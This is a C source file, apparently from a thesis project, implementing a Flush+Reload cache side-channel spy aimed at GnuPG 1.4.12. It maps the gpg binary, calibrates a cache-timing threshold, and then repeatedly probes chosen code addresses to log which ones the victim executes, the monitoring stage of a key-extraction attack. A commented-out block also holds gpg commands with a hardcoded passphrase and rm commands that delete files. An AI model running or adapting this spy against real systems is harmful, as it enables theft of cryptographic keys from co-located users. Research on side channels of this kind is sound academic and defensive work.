#define _GNU_SOURCE

#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h> //open
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> //close
#include <sched.h>

#include "../../Utils/src/assemblyinstructions.h"
#include "../../Utils/src/cachetechniques.h"
#include "../../Utils/src/csvutils.h"

#define handle_error(msg) \
	do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define EXE_FILENAME "/home/root/gnupg-1.4.12/bin/gpg"

#define EXE_ADDRS_FILENAME "/home/root/thesis-code/exe_addresses.txt"

#define ANALYSIS_CSV_FILENAME "/home/root/thesis-code/static_analysis.csv"

#define MAX_ADDRS_TO_MONITOR 10

#define MAX_TIMES_TO_MONITOR_EACH_ADDRS 5000

#define MAX_ITERATIONS_TO_REDUCE_ERROR 5

#define GPG_MAX_SIZE_BYTES 4194304

#define THRESHOLD 45

unsigned long obtainthreshold() {
	const int MAX_TIME = 80;
	const int MAX_WITHOUT_NOISE_ARRAY = 5 * 1024;
	const int MID_ARRAY = 2 * 1024;
	unsigned int array[MAX_WITHOUT_NOISE_ARRAY];
	unsigned int hit_counts[MAX_TIME];
	unsigned int miss_counts[MAX_TIME];
	int i;

	memset(array, -1, MAX_WITHOUT_NOISE_ARRAY * sizeof(unsigned int));
	reload(array + MID_ARRAY);
	sched_yield();
	//4MB
	for (i = 0; i < 4 * 1024 * 1024; ++i) {
		unsigned long time = reload(array + MID_ARRAY) / 5;
		hit_counts[time > (MAX_TIME - 1) ? MAX_TIME - 1 : time]++;
		sched_yield();
	}

	for (i = 0; i < 4 * 1024 * 1024; ++i) {
		flush(array + MID_ARRAY);
		unsigned long time = reload(array + MID_ARRAY) / 5;
		miss_counts[time > (MAX_TIME - 1) ? MAX_TIME - 1 : time]++;
		sched_yield();
	}
	unsigned int hit_max = 0;
	unsigned int hit_max_index = 0;
	unsigned int miss_min_index = 0;
	printf("TSC:           HITS           MISSES\n");
	for (i = 0; i < MAX_TIME; ++i) {
		printf("%3d: %10zu %10zu\n",i*5,hit_counts[i], miss_counts[i]);
		if (hit_max < hit_counts[i]) {
			hit_max = hit_counts[i];
			hit_max_index = i;
		}
		if (miss_counts[i] > 3 && miss_min_index == 0)
			miss_min_index = i;
	}
	unsigned int nr_times_threshold = -1UL;
	unsigned int threshold = 0;

	for (i = hit_max_index; i < miss_min_index; ++i) {
		if (nr_times_threshold > (hit_counts[i] + miss_counts[i])) {
			nr_times_threshold = hit_counts[i] + miss_counts[i];
			threshold = i;
		}
	}
	return threshold * 5;
}

long int getaddrstomonitor(const char* exeaddrsfilename, long int* out_addrs) {
	FILE* ptr_addrs = fopen(exeaddrsfilename, "r");
	if (ptr_addrs == NULL)
		handle_error("fopen_exeaddrsfilename");
	unsigned int linesize = 0, linelength = 0;
	char* line = malloc(256 * sizeof(char*));
	char* pEnd;
	long int nr_addrs = 0;
	int i;

	if ((linelength = getline(&line, &linesize, ptr_addrs)) <= 0)
		handle_error("getline_nr_addrs <= 0");
	line[linelength - 1] = '\0';
	nr_addrs = strtol(line, &pEnd, 10);
	if (*pEnd != '\r' && *pEnd != '\n' && *pEnd != '\0')
		handle_error("strtol_nr_addrs != \\r or \\n or \\0");

	long int addraux;

	for (i = 0; i < nr_addrs; ++i) {
		if ((linelength = getline(&line, &linesize, ptr_addrs)) <= 0)
			handle_error("getline_addrs <= 0");
		addraux = strtol(line, &pEnd, 0);
		if (*pEnd != '\r' && *pEnd != '\n' && *pEnd != '\0')
			handle_error("strtol_addrs != \\r or \\n or \\0");
		out_addrs[i] = addraux;
	}
	free(line);
	fclose(ptr_addrs);
	return nr_addrs;
}

int setcpuaffinity(int cpu) {
	//sched_setaffinity(0);
	cpu_set_t cs;
	CPU_ZERO(&cs);
	CPU_SET(cpu, &cs);
	if (sched_setaffinity(0, sizeof(cs), &cs) < 0)
		return -1;
	return 0;
}

void delayloop(unsigned int cycles) {
	unsigned long long start = rdtscp();
	while ((rdtscp()-start) < cycles);
}

int main() {
//	const unsigned long long threshold = obtainthreshold();
//	printf("THRESHOLD ::: %llu\n\r", threshold);
//	const unsigned long long THRESHOLD = 45;

//	setcpuaffinity(0);

	int fd_exe;
	struct stat sbuff;
	char* mapping_addr;

	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
	int nr_addrs;

	//share the executable
	fd_exe = open(EXE_FILENAME, O_RDONLY);
	if (fd_exe == -1)
		handle_error("open_exe_filename");
	if (fstat(fd_exe, &sbuff) == -1)
		handle_error("fstat");
	mapping_addr = (char*) mmap(0, GPG_MAX_SIZE_BYTES, PROT_READ, MAP_PRIVATE,
			fd_exe, 0);
	if (mapping_addr == MAP_FAILED)
		handle_error("mmap");
	printf(".exe shared\n");

	//obtain the addrs to monitor
	nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME, exe_addrs);
	printf(".exe addrs obtained\n");

	unsigned long ptr_offset = (unsigned long) mapping_addr;
	unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs];

	//monitor .exe addrs
	printf(".exe addrs monitor\n");

	int times, addrs_index;
	int gnupgwasaccessed = -1;
	for(;;)
	{
		int times, addrs_index;
		for (times = 0; times < MAX_TIMES_TO_MONITOR_EACH_ADDRS; ++times) {
			int k;
			for (k = 0; k < 5; ++k)
				sched_yield();

			for (addrs_index = 0; addrs_index < nr_addrs; ++addrs_index) {
				analysis_array[times][addrs_index] = THRESHOLD;
				char * aux = (char*) exe_addrs[addrs_index];
				char * ptr_to_monitor = aux + ptr_offset;
				unsigned int auxtsc = reloadandflush(ptr_to_monitor); //< THRESHOLD ? 1 : 0;

				if(auxtsc < THRESHOLD)
				{
					analysis_array[times][addrs_index] = 1;
					if(gnupgwasaccessed == -1)
					{
						printf("gnupg was accessed TIMES: %d\n",times);
						gnupgwasaccessed = 0;
					}

				}
				sched_yield();

			}
		}
		if(gnupgwasaccessed == -1)
			delayloop(500);
		else
			break;
	}
	//results to csv file
	arraytocsv(THRESHOLD,ANALYSIS_CSV_FILENAME, exe_addrs,
	MAX_TIMES_TO_MONITOR_EACH_ADDRS, nr_addrs, analysis_array);
	printf(".exe results to csv file\n");

	munmap(mapping_addr, sbuff.st_size);
	close(fd_exe);
	return 0;

}

/*
 *REMOVED... BACKUP
 *
 * #define CMD_ENCRYPT_STR "taskset 0x00000001 /home/root/gnupg-1.4.12/bin/gpg  -e -r inesc@inesc.pt /home/root/gnupg-1.4.12/bin/message.txt"

#define CMD_DECRYPT_STR "taskset 0x00000001 echo 1a2b3cinesc | /home/root/gnupg-1.4.12/bin/gpg --passphrase-fd 0 /home/root/gnupg-1.4.12/bin/message.txt.gpg"

#define CMD_RM_ENCRYPT_STR "rm /home/root/gnupg-1.4.12/bin/*.gpg"

#define CMD_RM_DECRYPT_STR "rm /home/root/gnupg-1.4.12/bin/*.txt"
 * 	//		if (times == 2000) {
	//
	//			if (fork() == 0) {
	//				// Child process will return 0 from fork()
	//
	//				//UNCOMMENT WHE ENCRYPT
	//				//int errno = system(CMD_ENCRYPT_STR);
	//
	//				//COMMENT WHEN ENCRYPT
	//				int errno = system(CMD_DECRYPT_STR);
	//
	//				//UNCOMMENT WHE ENCRYPT
	//				//int errno2 = system(CMD_RM_ENCRYPT_STR);
	//
	//				//COMMENT WHEN ENCRYPT
	//				int errno2 = system(CMD_RM_DECRYPT_STR);
	//
	//				if (errno == -1 || errno2 == -1)
	//					handle_error("system() running gnupg or removing files");
	//				exit(0);
	//			}
	//			// Parent process will return a non-zero value from fork()
	//		}*/

